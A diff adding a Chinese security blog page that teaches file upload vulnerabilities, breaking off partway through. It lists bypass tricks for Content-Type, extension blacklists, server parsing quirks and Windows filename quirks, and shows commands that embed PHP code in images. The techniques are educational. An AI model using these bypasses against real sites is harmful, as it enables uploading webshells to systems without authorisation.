@@ -1,0 +1,1101 @@
+  <!DOCTYPE html>
+  <html lang="en"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_4k4bc36ef96';window.REIMU_CONFIG.clipboard_tips = {"success":{"en":"Copy successfully (*^▽^*)"},"fail":{"en":"Copy failed (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = 'All articles on this blog are licensed under the BY-NC-SA license agreement unless otherwise stated. Please indicate the source when reprinting!';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://cl1ck-t0.github.io';</script>
+  <title>
+    文件上传漏洞 | Cl1ck-t0&#39;s blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+    <meta name="description" content="文件上传漏洞  一、前置知识  1.1 文件上传漏洞概述 什么是文件上传漏洞？  网站允许用户上传文件（头像、附件、图片等） 如果服务端未严格检查，攻击者可上传恶意脚本 当 Web 服务器解析执行该脚本时，就形成了漏洞  核心思想：  上传成功 ≠ 利用成功  完整的攻击链需要四步： 1上传 → 保存 → 访问 → 解析  1.2 HTTP 上传请求基础 multipart&#x2F;form-data">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件上传漏洞">
+<meta property="og:url" content="https://cl1ck-t0.github.io/2026/08/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Cl1ck-t0&#39;s blog">
+<meta property="og:description" content="文件上传漏洞  一、前置知识  1.1 文件上传漏洞概述 什么是文件上传漏洞？  网站允许用户上传文件（头像、附件、图片等） 如果服务端未严格检查，攻击者可上传恶意脚本 当 Web 服务器解析执行该脚本时，就形成了漏洞  核心思想：  上传成功 ≠ 利用成功  完整的攻击链需要四步： 1上传 → 保存 → 访问 → 解析  1.2 HTTP 上传请求基础 multipart&#x2F;form-data">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2026-08-17T08:44:45.000Z">
+<meta property="article:modified_time" content="2026-08-17T09:27:43.441Z">
+<meta property="article:author" content="Cl1ck-t0">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="web漏洞">
+<meta name="twitter:card" content="summary">
+    <link rel="alternate" href="/atom.xml" title="Cl1ck-t0's blog" type="application/atom+xml">
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+      <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.css" integrity="sha384-tTgKLjMYmJr94v8qu2PE5MUGSMbyN2xiH266JUB3gpm8vnnJywd1dWSOEfrFz+YI" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+    <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/aplayer@1.10.1/dist/APlayer.min.css" integrity="sha384-tLMkTWh2pfXNWGFlUS0w1TFtRG5xZ9lPWFOooj+vDDLIL+xBGQU/voDBY5XE2lVh" crossorigin="anonymous">
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">Loading...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/">
+          <span class="main-nav-link">Home</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/archives">
+          <span class="main-nav-link">Archives</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/about">
+          <span class="main-nav-link">About</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/friend">
+          <span class="main-nav-link">Friend</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/atom.xml">
+          <span class="main-nav-link">rss</span>
+        </span>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" aria-label="RSS Feed" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/images/banner.webp" alt="文件上传漏洞">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">文件上传漏洞</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+      <meting-js
+        theme="var(--color-link)"
+        id="6868625065"
+        server="netease"
+        type="playlist"
+        
+        
+        autoplay="false"
+        loop="all"
+        order="list"
+        
+        volume="0.7"
+        mutex="true"
+        
+        
+      ></meting-js>
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text"> 文件上传漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.1.</span> <span class="toc-text"> 一、前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#11-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 1.1 文件上传漏洞概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-http-%E4%B8%8A%E4%BC%A0%E8%AF%B7%E6%B1%82%E5%9F%BA%E7%A1%80"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 1.2 HTTP 上传请求基础</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#13-%E4%B8%89%E4%B8%AA%E5%85%B3%E9%94%AE%E6%A6%82%E5%BF%B5"><span class="toc-number">1.1.3.</span> <span class="toc-text"> 1.3 三个关键概念</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E5%B8%B8%E8%A7%81%E6%A3%80%E6%9F%A5%E6%9C%BA%E5%88%B6%E4%B8%8E%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.</span> <span class="toc-text"> 二、常见检查机制与绕过方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#21-%E5%89%8D%E7%AB%AF%E6%A3%80%E6%9F%A5javascript"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 2.1 前端检查（JavaScript）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#22-content-type-%E6%A3%80%E6%9F%A5"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 2.2 Content-Type 检查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#23-%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E6%A3%80%E6%9F%A5"><span class="toc-number">1.2.3.</span> <span class="toc-text"> 2.3 文件后缀检查</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-number">1.2.3.1.</span> <span class="toc-text"> 黑名单</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%99%BD%E5%90%8D%E5%8D%95"><span class="toc-number">1.2.3.2.</span> <span class="toc-text"> 白名单</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#24-%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%9F%A5"><span class="toc-number">1.2.4.</span> <span class="toc-text"> 2.4 文件内容检查</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89-web-%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%9C%BA%E5%88%B6"><span class="toc-number">1.3.</span> <span class="toc-text"> 三、Web 服务器解析机制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#31-%E8%A7%A3%E6%9E%90%E6%B5%81%E7%A8%8B"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 3.1 解析流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#32-%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8A%E4%BC%A0%E6%88%90%E5%8A%9F%E4%BD%86%E6%97%A0%E6%B3%95%E6%89%A7%E8%A1%8C"><span class="toc-number">1.3.2.</span> <span class="toc-text"> 3.2 为什么上传成功但无法执行？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#33-htaccessapache-%E7%89%B9%E6%AE%8A%E6%9C%BA%E5%88%B6"><span class="toc-number">1.3.3.</span> <span class="toc-text"> 3.3 .htaccess（Apache 特殊机制）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98"><span class="toc-number">1.4.</span> <span class="toc-text"> 四、常见问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#41-%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E9%97%AE%E9%A2%98"><span class="toc-number">1.4.1.</span> <span class="toc-text"> 4.1 基础概念问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#42-%E6%A3%80%E6%9F%A5%E6%9C%BA%E5%88%B6%E9%97%AE%E9%A2%98"><span class="toc-number">1.4.2.</span> <span class="toc-text"> 4.2 检查机制问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#43-%E5%88%A9%E7%94%A8%E9%93%BE%E9%97%AE%E9%A2%98"><span class="toc-number">1.4.3.</span> <span class="toc-text"> 4.3 利用链问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#44-%E9%98%B2%E5%BE%A1%E9%97%AE%E9%A2%98"><span class="toc-number">1.4.4.</span> <span class="toc-text"> 4.4 防御问题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94-%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93"><span class="toc-number">1.5.</span> <span class="toc-text"> 五、实战总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#51-%E5%9F%BA%E7%A1%80%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.5.1.</span> <span class="toc-text"> 5.1 基础上传利用步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#52-%E4%B8%8D%E5%90%8C%E6%A3%80%E6%9F%A5%E7%9A%84%E5%BA%94%E5%AF%B9%E7%AD%96%E7%95%A5"><span class="toc-number">1.5.2.</span> <span class="toc-text"> 5.2 不同检查的应对策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#53-%E5%85%B3%E9%94%AE%E6%8E%92%E6%9F%A5%E6%80%9D%E8%B7%AF"><span class="toc-number">1.5.3.</span> <span class="toc-text"> 5.3 关键排查思路</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD-%E6%8B%93%E5%B1%95%E5%86%85%E5%AE%B9"><span class="toc-number">1.6.</span> <span class="toc-text"> 六、拓展内容</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#61-%E5%85%B6%E4%BB%96%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="toc-number">1.6.1.</span> <span class="toc-text"> 6.1 其他绕过技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#62-%E9%98%B2%E5%BE%A1%E5%8A%A0%E5%9B%BA%E6%96%B9%E6%A1%88"><span class="toc-number">1.6.2.</span> <span class="toc-text"> 6.2 防御加固方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#63-%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E6%96%B9%E5%90%91"><span class="toc-number">1.6.3.</span> <span class="toc-text"> 6.3 进阶学习方向</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#64-%E5%BF%AB%E9%80%9F%E8%87%AA%E6%A3%80"><span class="toc-number">1.6.4.</span> <span class="toc-text"> 6.4 快速自检</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84%E5%BD%95%E5%B8%B8%E7%94%A8-payload-%E9%9B%86%E5%90%88"><span class="toc-number">1.7.</span> <span class="toc-text"> 附录：常用 Payload 集合</span></a></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Cl1ck-t0" class="lazyload">
+  <div class="sidebar-author-name">Cl1ck-t0</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">32</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">20</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-rss sidebar-social-icon">
+      <a href=/atom.xml itemprop="url" target="_blank" aria-label="rss" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+        <div class="sidebar-menu-link">Friend</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/atom.xml" aria-label="rss"></a>
+        <div class="sidebar-menu-link">rss</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-文件上传漏洞" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-08-17T08:44:45.000Z" itemprop="datePublished">2026-08-17</time>
+    <time style="display: none;" id="post-update-time">2026-08-17</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="文件上传漏洞"><a class="markdownIt-Anchor" href="#文件上传漏洞"></a> 文件上传漏洞</h1>
+<h2 id="一-前置知识"><a class="markdownIt-Anchor" href="#一-前置知识"></a> 一、前置知识</h2>
+<h3 id="11-文件上传漏洞概述"><a class="markdownIt-Anchor" href="#11-文件上传漏洞概述"></a> 1.1 文件上传漏洞概述</h3>
+<p><strong>什么是文件上传漏洞？</strong></p>
+<ul>
+<li>网站允许用户上传文件（头像、附件、图片等）</li>
+<li>如果服务端未严格检查，攻击者可上传恶意脚本</li>
+<li>当 Web 服务器解析执行该脚本时，就形成了漏洞</li>
+</ul>
+<p><strong>核心思想：</strong></p>
+<blockquote>
+<p><strong>上传成功 ≠ 利用成功</strong></p>
+</blockquote>
+<p>完整的攻击链需要四步：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">上传 → 保存 → 访问 → 解析</span><br></pre></td></tr></table></figure>
+<h3 id="12-http-上传请求基础"><a class="markdownIt-Anchor" href="#12-http-上传请求基础"></a> 1.2 HTTP 上传请求基础</h3>
+<p><strong>multipart/form-data</strong></p>
+<ul>
+<li>HTML 上传文件时的编码类型</li>
+<li>示例：</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>PHP 中的 $_FILES 数组</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>] = [</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>     =&gt; <span class="string">&#x27;cat.jpg&#x27;</span>,        <span class="comment">// 客户端原始文件名</span></span><br><span class="line">    <span class="string">&#x27;type&#x27;</span>     =&gt; <span class="string">&#x27;image/jpeg&#x27;</span>,     <span class="comment">// 客户端 MIME 类型</span></span><br><span class="line">    <span class="string">&#x27;size&#x27;</span>     =&gt; <span class="number">12345</span>,            <span class="comment">// 文件大小</span></span><br><span class="line">    <span class="string">&#x27;tmp_name&#x27;</span> =&gt; <span class="string">&#x27;/tmp/phpXyZ&#x27;</span>,    <span class="comment">// 临时文件路径</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+<h3 id="13-三个关键概念"><a class="markdownIt-Anchor" href="#13-三个关键概念"></a> 1.3 三个关键概念</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">概念</th>
+<th style="text-align:left">说明</th>
+<th style="text-align:left">示例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><strong>文件名</strong></td>
+<td style="text-align:left">客户端提供的原始文件名</td>
+<td style="text-align:left"><code>shell.php</code></td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>Content-Type</strong></td>
+<td style="text-align:left">客户端声称的 MIME 类型</td>
+<td style="text-align:left"><code>image/jpeg</code></td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>文件真实内容</strong></td>
+<td style="text-align:left">文件实际的二进制数据</td>
+<td style="text-align:left">JPEG 文件头为 <code>FF D8 FF E0</code></td>
+</tr>
+</tbody>
+</table>
+<h2 id="二-常见检查机制与绕过方法"><a class="markdownIt-Anchor" href="#二-常见检查机制与绕过方法"></a> 二、常见检查机制与绕过方法</h2>
+<h3 id="21-前端检查javascript"><a class="markdownIt-Anchor" href="#21-前端检查javascript"></a> 2.1 前端检查（JavaScript）</h3>
+<p><strong>检查方式：</strong></p>
+<ul>
+<li>JS 验证文件扩展名</li>
+<li>JS 限制文件大小</li>
+<li>HTML <code>accept</code> 属性限制选择类型</li>
+</ul>
+<p><strong>绕过方法：</strong></p>
+<ol>
+<li>浏览器禁用 JavaScript</li>
+<li>使用 Burp 抓包后修改文件名</li>
+<li>直接构造 HTTP 请求发送</li>
+</ol>
+<p><strong>核心结论：</strong></p>
+<blockquote>
+<p>前端限制只是用户体验措施，不能作为安全边界</p>
+</blockquote>
+<h3 id="22-content-type-检查"><a class="markdownIt-Anchor" href="#22-content-type-检查"></a> 2.2 Content-Type 检查</h3>
+<p><strong>检查方式：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] !== <span class="string">&#x27;image/jpeg&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;只允许上传 JPEG 图片&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>问题：</strong></p>
+<ul>
+<li><code>$_FILES['file']['type']</code> 来自 HTTP 请求头</li>
+<li>攻击者可随意修改</li>
+</ul>
+<p><strong>绕过方法：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">修改请求中的 Content-Type: image/jpeg</span><br></pre></td></tr></table></figure>
+<h3 id="23-文件后缀检查"><a class="markdownIt-Anchor" href="#23-文件后缀检查"></a> 2.3 文件后缀检查</h3>
+<h4 id="黑名单"><a class="markdownIt-Anchor" href="#黑名单"></a> 黑名单</h4>
+<p><strong>特点：</strong> 禁止已知危险后缀，其他默认允许</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$blacklist</span> = [<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;php5&#x27;</span>, <span class="string">&#x27;phtml&#x27;</span>, <span class="string">&#x27;asp&#x27;</span>, <span class="string">&#x27;jsp&#x27;</span>];</span><br></pre></td></tr></table></figure>
+<p><strong>问题：</strong></p>
+<ol>
+<li>需要穷举所有危险后缀不现实</li>
+<li>可能遗漏特殊配置下的解析后缀</li>
+<li>不同 Web 服务器解析规则不同</li>
+</ol>
+<p><strong>绕过思路：</strong></p>
+<ul>
+<li>大小写绕过：<code>.pHp</code>（如果系统不区分大小写）</li>
+<li>双写绕过：<code>.phphpp</code></li>
+<li>特殊扩展名：<code>.php5</code>, <code>.phtml</code>, <code>.phar</code></li>
+<li>Apache 解析：<code>.php.xxx</code>（默认从右到左找识别的扩展名）</li>
+<li>Nginx 解析：<code>/test.jpg/test.php</code>（路径解析漏洞）</li>
+<li>利用 <code>.htaccess</code> 改变解析规则</li>
+<li>利用 Windows 特性：<code>shell.php.</code> 或 <code>shell.php::$DATA</code></li>
+</ul>
+<h4 id="白名单"><a class="markdownIt-Anchor" href="#白名单"></a> 白名单</h4>
+<p><strong>特点：</strong> 只允许指定后缀，其他全部拒绝</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>];</span><br></pre></td></tr></table></figure>
+<p><strong>优势：</strong> 比黑名单更安全<br />
+<strong>但仍有问题：</strong> 白名单只检查后缀，不验证文件真实内容</p>
+<h3 id="24-文件内容检查"><a class="markdownIt-Anchor" href="#24-文件内容检查"></a> 2.4 文件内容检查</h3>
+<p><strong>检查方式：</strong></p>
+<p><strong>文件头（Magic Bytes）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JPEG:  FF D8 FF E0</span><br><span class="line">PNG:   89 50 4E 47</span><br><span class="line">GIF:   47 49 46 38</span><br></pre></td></tr></table></figure>
+<p><strong>PHP 函数</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方法1：finfo</span></span><br><span class="line"><span class="variable">$finfo</span> = <span class="title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);</span><br><span class="line"><span class="variable">$mime</span> = <span class="title function_ invoke__">finfo_file</span>(<span class="variable">$finfo</span>, <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法2：getimagesize()</span></span><br><span class="line"><span class="variable">$info</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+<p><strong>Linux file 命令</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file shell.jpg</span><br><span class="line"># 输出: JPEG image data ...</span><br></pre></td></tr></table></figure>
+<p><strong>绕过方法：图片马（Image Trojan）</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在真实图片后追加 PHP 代码</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span> &gt;&gt; real_image.jpg</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或使用 exiftool</span></span><br><span class="line">exiftool -Comment=<span class="string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span> image.jpg</span><br></pre></td></tr></table></figure>
+<p><strong>图片马的特点：</strong></p>
+<ul>
+<li>能被识别为正常图片</li>
+<li>包含额外的恶意内容</li>
+<li><strong>自身不会自动执行</strong>（需要配合其他漏洞）</li>
+</ul>
+<h2 id="三-web-服务器解析机制"><a class="markdownIt-Anchor" href="#三-web-服务器解析机制"></a> 三、Web 服务器解析机制</h2>
+<h3 id="31-解析流程"><a class="markdownIt-Anchor" href="#31-解析流程"></a> 3.1 解析流程</h3>
